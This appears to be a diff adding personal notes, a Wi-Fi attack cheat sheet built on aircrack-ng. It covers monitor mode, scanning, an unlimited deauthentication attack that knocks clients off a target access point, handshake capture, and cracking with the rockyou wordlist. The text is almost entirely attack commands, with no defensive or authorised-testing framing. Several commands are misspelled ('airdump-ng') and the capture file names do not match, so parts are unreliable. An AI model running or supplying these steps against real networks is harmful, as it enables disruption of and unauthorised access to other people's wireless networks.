@@ -1,0 +1,33 @@
+to install the required drivr to us adaptr
+sudo apt update
+sudo apt upgrade
+sudo reboot
+sudo apt install realtek-rtl88xxau-dkms
+sudo reboot
+
+for starting the wlan0(putting it in monitor mode)
+airmon-ng start wlan0
+
+to kill running tasks 
+sudo airmon-ng check-kill 
+
+
+for viewing all the networks in area 
+sudo airodump-ng wlan0
+
+for viewing sigular network
+sudo airdump-ng wlan0 -d (bssid)
+
+for launching deauthentication attack open 2 windows 
+in first 
+run sudo airdump-ng -w hack1 -c (channel) --bssid (the value of bssid) wlan0
+
+2nd terminal run sudo aireplay-ng --deauth 0 -a (bssid) wlan0
+the above step deauthenticates connecting devices 
+
+to dictinory attack 
+first 
+run sudo airdump-ng -w hack1 -c (channel) --bssid (the value of bssid) wlan0
+
+then 
+aircrack-ng hack-01.cap -w /usr/share/wordlists/rockyou.txt
